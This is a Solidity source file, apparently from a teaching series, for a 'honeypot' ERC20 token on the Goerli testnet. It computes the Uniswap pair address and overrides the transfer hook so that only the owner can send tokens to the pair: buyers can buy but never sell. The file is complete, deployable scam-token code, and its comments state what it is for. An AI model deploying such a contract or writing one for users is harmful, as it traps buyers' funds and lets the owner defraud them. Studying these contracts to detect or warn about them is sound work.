// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// Simple Honeypot ERC20 token, can only be bought, not sold
contract HoneyPot is ERC20, Ownable {
    address public pair;
    // Constructor: Initialize token name and symbol
    constructor() ERC20("HoneyPot", "Pi Xiu") {
        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory
        address tokenA = address(this); // Honeypot token address
        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; // goerli WETH
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); // Sort tokenA and tokenB in ascending order
        bytes32 salt = keccak256(abi.encodePacked(token0, token1));
        // calculate pair address
        pair = address(uint160(uint(keccak256(abi.encodePacked(
        hex'ff',
        factory,
        salt,
        hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
        )))));
    }
    
    /**
     * Mint function, can only be called by the contract owner
     */
    function mint(address to, uint amount) public onlyOwner {
        _mint(to, amount);
    }

    /**
     * @dev See {ERC20-_beforeTokenTransfer}.
     * Honeypot function: Only the contract owner can sell
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        // Revert if the transfer target address is the LP contract
        if(to == pair){
            require(from == owner(), "Can not Transfer");
        }
    }
}